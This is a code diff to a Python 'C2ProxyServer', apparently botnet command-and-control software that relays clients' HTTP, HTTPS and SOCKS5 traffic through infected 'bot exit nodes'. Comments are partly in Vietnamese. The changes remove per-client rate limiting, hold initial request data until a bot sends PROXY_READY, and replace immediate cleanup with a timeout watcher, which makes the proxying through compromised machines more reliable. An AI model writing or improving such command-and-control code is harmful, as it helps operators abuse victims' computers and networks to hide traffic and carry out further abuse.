@@ -504,17 +504,8 @@ class C2ProxyServer:
                 
     def handle_proxy_request(self, client_socket, client_addr):
         """Xử lý proxy request từ client"""
-        # Rate limiting
-        client_key = client_addr[0]
+        # Create connection id
         current_time = time.time()
-        if client_key in self.client_requests:
-            if current_time - self.client_requests[client_key] < 1.0:  # 1 request per second
-                print(f"⚠️  Rate limit exceeded for {client_key}")
-                client_socket.send(b"HTTP/1.1 429 Too Many Requests\r\n\r\n")
-                client_socket.close()
-                return
-        self.client_requests[client_key] = current_time
-        
         connection_id = f"{client_addr[0]}:{client_addr[1]}:{int(current_time)}"
         
         try:
@@ -605,8 +596,8 @@ class C2ProxyServer:
             print(f"❌ Error handling proxy request: {e}")
             self.stats['failed_requests'] += 1
         finally:
-            if connection_id in self.active_proxy_connections:
-                self.cleanup_proxy_connection(connection_id)
+            # Lifecycle managed by END/ERR frames and timeout watcher
+            pass
 
     def direct_proxy_relay(self, client_socket, initial_request, target_host, target_port, is_https):
         """Relays traffic directly between client and target. For HTTPS (CONNECT), establishes a tunnel."""
@@ -816,8 +807,8 @@ class C2ProxyServer:
             print(f"❌ Error handling SOCKS5 request: {e}")
             self.stats['failed_requests'] += 1
         finally:
-            if connection_id in self.active_proxy_connections:
-                self.cleanup_proxy_connection(connection_id)
+            # Lifecycle managed by END/ERR frames and timeout watcher
+            pass
                 
     def forward_socks_request_to_bot(self, connection_id, target_host, target_port):
         """Forward SOCKS5 request đến bot exit node"""
@@ -852,27 +843,33 @@ class C2ProxyServer:
             print(f"📤 Sending to bot {bot_id}: {command.strip()}")
             bot_socket.sendall(command.encode())
 
-            # Gửi DATA frame ngay lập tức (tạm thời tắt acknowledgment)
+            # Store initial data and wait for PROXY_READY before sending
             if request_data:
-                print(f"📤 Sending DATA frame immediately to bot {bot_id} for {'HTTPS' if connection['is_https'] else 'HTTP'} request")
-                # Small delay to ensure bot creates connection first
-                import time
-                time.sleep(0.1)
-                self._send_data_frame_to_bot(bot_socket, connection_id, request_data)
+                print(f"⏳ Stored initial request data, waiting for PROXY_READY from {bot_id}")
+                self.active_proxy_connections[connection_id]['pending_data'] = request_data
             else:
                 print(f"⚠️  No request data to send to bot")
 
             # Bắt đầu 2 chiều: client->bot (DATA frames) và bot->client (RESP frames)
             threading.Thread(target=self._pump_client_to_bot, args=(connection_id,), daemon=True).start()
             
-            # Thêm timeout cleanup cho connection
+            # Thêm timeout cleanup cho connection (đợi PROXY_READY / dữ liệu hồi đáp)
             def cleanup_timeout():
                 import time
-                time.sleep(30)  # 30 second timeout
+                waited = 0
+                while waited < 60:
+                    if connection_id not in self.active_proxy_connections:
+                        return
+                    # If we received data (pending_data removed), exit watcher
+                    conn = self.active_proxy_connections.get(connection_id, {})
+                    if 'pending_data' not in conn:
+                        return
+                    time.sleep(1)
+                    waited += 1
                 if connection_id in self.active_proxy_connections:
-                    print(f"⏰ Connection {connection_id} timeout, cleaning up")
+                    print(f"⏰ Connection {connection_id} timed out waiting for bot, cleaning up")
                     self.cleanup_proxy_connection(connection_id)
-            
+
             threading.Thread(target=cleanup_timeout, daemon=True).start()
             
             # Update bot statistics
